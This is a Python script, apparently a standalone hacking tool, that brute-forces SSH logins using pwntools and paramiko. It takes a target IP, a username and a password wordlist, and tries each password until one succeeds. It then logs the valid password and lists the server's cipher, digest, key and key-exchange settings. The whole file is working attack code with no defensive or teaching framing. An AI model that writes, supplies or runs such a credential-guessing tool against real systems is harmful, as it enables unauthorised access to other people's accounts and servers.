from pwn import *
import paramiko

# Constants
TIMEOUT = 5

# ASCII art
ascii_art = '''

╔═══╦═══╦╗─╔╦══╗─────╔╗───╔═══╗─────────╔════╗────╔╗
║╔═╗║╔═╗║║─║║╔╗║────╔╝╚╗──║╔══╝─────────║╔╗╔╗║────║║
║╚══╣╚══╣╚═╝║╚╝╚╦═╦╗╠╗╔╬══╣╚══╦══╦═╦══╦═╩╣║║╠╩═╦══╣║
╚══╗╠══╗║╔═╗║╔═╗║╔╣║║║║║║═╣╔══╣╔╗║╔╣╔═╣║═╣║║║╔╗║╔╗║║
║╚═╝║╚═╝║║─║║╚═╝║║║╚╝║╚╣║═╣║──║╚╝║║║╚═╣║═╣║║║╚╝║╚╝║╚╗
╚═══╩═══╩╝─╚╩═══╩╝╚══╩═╩══╩╝──╚══╩╝╚══╩══╝╚╝╚══╩══╩═╝

'''

# Setup logging
log.info(ascii_art)
log.info("Starting SSH bruteforce script")

# Get user input
host = input("Enter the target host IP: ")
username = input("Enter the username: ")
password_file = input("Enter the path to the password file: ")

# Attempt SSH login
attempts = 0
with open(password_file, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            log.info("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=TIMEOUT)

            if response.connected():
                log.success("[+] Valid password found: '{}'!".format(password))
                # Additional logging about security settings
                try:
                    log.info("[*] Checking security settings on '{}'".format(host))
                    transport = paramiko.Transport((host, 22))
                    transport.connect(username=username, password=password)

                    # Get security options
                    security_options = transport.get_security_options()

                    # Print specific attributes in a more human-readable format
                    log.success("[*] Security settings checked successfully on '{}'".format(host))
                    log.info("[*] Ciphers:\n\t{}".format("\n\t".join(security_options.ciphers)))
                    log.info("[*] Digests:\n\t{}".format("\n\t".join(security_options.digests)))
                    log.info("[*] Key Types:\n\t{}".format("\n\t".join(security_options.key_types)))
                    log.info("[*] Key Exchange Algorithms:\n\t{}".format("\n\t".join(security_options.kex)))
                    log.info("[*] Compression Algorithms:\n\t{}".format("\n\t".join(security_options.compression)))

                    transport.close()
                except Exception as security_exception:
                    log.failure("[!] Couldn't check security settings on '{}': {}".format(host, security_exception))
                response.close()
                break

            response.close()
        except paramiko.ssh_exception.AuthenticationException as auth_exception:
            log.failure("[X] Authentication failed: {}".format(auth_exception))
        except Exception as e:
            log.failure("[-] An error occurred: {}".format(e))
        attempts += 1

# Clean up and finalize
log.info("SSH bruteforce script completed")
